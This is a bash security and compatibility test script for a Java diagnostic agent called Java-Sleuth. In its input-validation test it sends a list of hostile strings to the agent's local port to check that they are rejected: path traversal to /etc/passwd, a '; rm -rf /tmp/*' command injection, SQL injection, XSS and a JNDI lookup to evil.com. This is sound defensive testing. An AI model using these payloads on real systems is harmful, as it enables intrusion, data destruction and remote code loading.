#!/bin/bash

# Security and compatibility test script for Java-Sleuth
echo "=== Java-Sleuth Security and Compatibility Testing ==="

echo "Test 1: Java Version Compatibility"
java -version 2>&1
echo ""

echo "Test 2: Agent Manifest Security Configuration"
echo "  Checking agent manifest entries:"
jar -tf target/java-sleuth-1.0.0-jar-with-dependencies.jar | grep -E "META-INF/MANIFEST.MF"
echo ""

echo "  Manifest content:"
unzip -q -c target/java-sleuth-1.0.0-jar-with-dependencies.jar META-INF/MANIFEST.MF
echo ""

echo "Test 3: Security Manager Compatibility"
echo "  Testing with security manager enabled:"
java -javaagent:target/java-sleuth-1.0.0-jar-with-dependencies.jar \
     -Djava.security.manager \
     -Djava.security.policy=all.policy \
     -cp target/java-sleuth-1.0.0.jar \
     com.javasleuth.test.TestApplication > /tmp/security-test.log 2>&1 &
SEC_PID=$!

sleep 3
if ps -p $SEC_PID > /dev/null; then
    echo "  ✓ Agent works with security manager"
    kill $SEC_PID 2>/dev/null || true
else
    echo "  ⚠ Agent may have issues with security manager"
    echo "  Log output:"
    cat /tmp/security-test.log | head -10
fi
echo ""

echo "Test 4: Input Validation Testing"
echo "  Testing malicious input handling:"

# Start clean test app
java -javaagent:target/java-sleuth-1.0.0-jar-with-dependencies.jar \
     -cp target/java-sleuth-1.0.0.jar \
     com.javasleuth.test.TestApplication > /dev/null 2>&1 &
APP_PID=$!

# Wait for agent to be ready
while ! nc -z localhost 3658 2>/dev/null; do
    sleep 0.1
done

# Test malicious inputs
malicious_inputs=(
    "../../../etc/passwd"
    "; rm -rf /tmp/*"
    "' OR 1=1 --"
    "<script>alert('xss')</script>"
    "\${jndi:ldap://evil.com/a}"
    "\\x00\\x01\\x02"
)

for input in "${malicious_inputs[@]}"; do
    result=$(echo "jad $input" | timeout 2 nc localhost 3658 2>/dev/null | head -5)
    if [[ "$result" == *"Error"* ]] || [[ "$result" == *"Class not found"* ]] || [[ "$result" == *"Invalid"* ]]; then
        echo "  ✓ Properly handled: $input"
    else
        echo "  ⚠ Potential issue with: $input"
    fi
done

kill $APP_PID 2>/dev/null || true
echo ""

echo "Test 5: File System Access Testing"
echo "  Testing file operations:"

# Test heap dump to various paths
java -javaagent:target/java-sleuth-1.0.0-jar-with-dependencies.jar \
     -cp target/java-sleuth-1.0.0.jar \
     com.javasleuth.test.TestApplication > /dev/null 2>&1 &
APP_PID=$!

while ! nc -z localhost 3658 2>/dev/null; do
    sleep 0.1
done

# Test valid heap dump
result=$(echo "heapdump /tmp/test-security.hprof" | timeout 3 nc localhost 3658 2>/dev/null)
if [[ "$result" == *"created"* ]] || [[ "$result" == *"Heap dump"* ]]; then
    echo "  ✓ Valid file operation works"
    rm -f /tmp/test-security.hprof
else
    echo "  ⚠ Valid file operation failed"
fi

# Test invalid path
result=$(echo "heapdump /root/test.hprof" | timeout 3 nc localhost 3658 2>/dev/null)
if [[ "$result" == *"Error"* ]] || [[ "$result" == *"Permission"* ]] || [[ "$result" == *"denied"* ]]; then
    echo "  ✓ Properly blocked invalid path"
else
    echo "  ⚠ May allow invalid path access"
fi

kill $APP_PID 2>/dev/null || true
echo ""

echo "Test 6: Cross-Platform Script Testing"
echo "  Testing launcher scripts:"

if [[ -f "sleuth.sh" ]]; then
    echo "  ✓ Unix script exists"
    if [[ -x "sleuth.sh" ]]; then
        echo "  ✓ Unix script is executable"
    else
        echo "  ⚠ Unix script not executable"
    fi
else
    echo "  ✗ Unix script missing"
fi

if [[ -f "sleuth.bat" ]]; then
    echo "  ✓ Windows script exists"
else
    echo "  ✗ Windows script missing"
fi

echo ""
echo "Test 7: Resource Leak Testing"
echo "  Testing for resource leaks:"

initial_fds=$(lsof -p $$ | wc -l)
echo "  Initial file descriptors: $initial_fds"

# Run multiple connection tests
for i in {1..10}; do
    java -javaagent:target/java-sleuth-1.0.0-jar-with-dependencies.jar \
         -cp target/java-sleuth-1.0.0.jar \
         com.javasleuth.test.TestApplication > /dev/null 2>&1 &
    APP_PID=$!

    while ! nc -z localhost 3658 2>/dev/null; do
        sleep 0.1
    done

    echo "help" | timeout 1 nc localhost 3658 > /dev/null 2>&1
    kill $APP_PID 2>/dev/null || true
    sleep 0.5
done

final_fds=$(lsof -p $$ 2>/dev/null | wc -l || echo "unknown")
echo "  Final file descriptors: $final_fds"

if [[ "$final_fds" != "unknown" ]] && [[ $final_fds -le $((initial_fds + 5)) ]]; then
    echo "  ✓ No significant resource leaks detected"
else
    echo "  ⚠ Potential resource leaks detected"
fi

echo ""
echo "=== Security and Compatibility Test Complete ==="